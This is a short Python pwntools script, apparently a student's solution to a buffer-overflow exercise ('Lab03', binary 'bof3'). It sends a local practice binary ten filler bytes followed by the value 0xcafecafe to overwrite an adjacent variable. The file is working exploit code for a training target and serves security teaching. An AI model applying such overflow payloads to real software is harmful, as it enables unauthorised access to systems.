#!/usr/bin/env python3
from pwn import *
import shutil, os, sys

path = '/home/kali/Desktop/svt/Lab03/lab03_material/bof'
BINARY = os.path.join(path, 'bof3')

def make_payload():
    offset = 10
    filler = b'A' * offset

    payload = filler + (0xcafecafe).to_bytes(4,'little')

    return payload

def main():
    io = process(BINARY)
    # launch via stdbuf so stdout is line-buffered even though it's a pipe
    #io = process([STDBUF, '-oL', BINARY])
    #io = gdb.debug(BINARY)

    payload = make_payload()
    log.info(f"Sending payload of length {len(payload)}")
    io.sendline(payload)

    # read remainder of program output
    out = io.recvall(timeout=1)
    print(out.decode())

if __name__ == '__main__':
    main()

